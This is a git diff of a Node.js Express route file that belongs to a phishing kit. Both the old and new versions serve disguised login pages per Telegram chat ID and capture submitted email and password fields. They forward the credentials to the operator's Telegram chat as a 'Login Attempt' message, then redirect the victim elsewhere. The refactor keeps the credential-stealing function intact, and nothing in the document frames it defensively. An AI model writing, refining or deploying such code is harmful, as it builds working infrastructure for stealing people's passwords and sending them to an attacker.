@@ -1,39 +1,46 @@
-// server/routes/pageRoutes.js
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
-const router = express.Router();
-const { bot } = require('../serverSetup');
-const { users } = require('../connection/db');
+const { users } = require('../admin/src/connection/db');
 
-// Render pages dynamically
-router.get('/:page/:chatId', (req, res) => {
-  const { page, chatId } = req.params;
-  const viewPath = path.join(__dirname, '../views', `${page}.ejs`);
+function registerPageRoutes(app, bot) {
+  const router = express.Router();
 
-  if (fs.existsSync(viewPath)) {
-    res.render(page, { chatId });
-  } else {
-    res.status(404).send('Page not found');
-  }
-});
+  // GET: Render dynamic EJS page
+  router.get('/:page/:chatId', (req, res) => {
+    const { page, chatId } = req.params;
+    const viewPath = path.join(__dirname, '../views', `${page}.ejs`);
 
-// Handle form submission
-router.post('/submit/:chatId', (req, res) => {
-  const chatId = req.params.chatId;
-  const { email, pass } = req.body;
+    if (fs.existsSync(viewPath)) {
+      res.render(page, { chatId });
+    } else {
+      res.status(404).send('❌ Page not found.');
+    }
+  });
 
-  if (users[chatId]) {
-    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}`;
-    bot.sendMessage(chatId, message, { parse_mode: 'HTML' })
-      .then(() => res.redirect(users[chatId].userRedirectUrl || 'https://example.com'))
-      .catch((error) => {
-        console.error('Error sending message to Telegram:', error);
-        res.status(500).send('Error sending message to Telegram');
-      });
-  } else {
-    res.status(400).send('Incorrect Submitted Data.');
-  }
-});
+  // POST: Handle form submission and send Telegram message
+  router.post('/submit/:chatId', async (req, res) => {
+    const chatId = req.params.chatId;
+    const { email, pass } = req.body;
 
-module.exports = router;
+    if (!users[chatId]) {
+      return res.status(400).send('❌ Invalid or expired session.');
+    }
+
+    const message = `🛂 <b>Login Attempt</b>\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}`;
+
+    try {
+      await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+      const redirectURL = users[chatId].userRedirectUrl || 'https://example.com';
+      res.redirect(redirectURL);
+    } catch (err) {
+      console.error('❌ Telegram send error:', err);
+      res.status(500).send('❌ Failed to send message via Telegram.');
+    }
+  });
+
+  // Attach the router to the app
+  app.use('/', router);
+}
+
+module.exports = { registerPageRoutes };
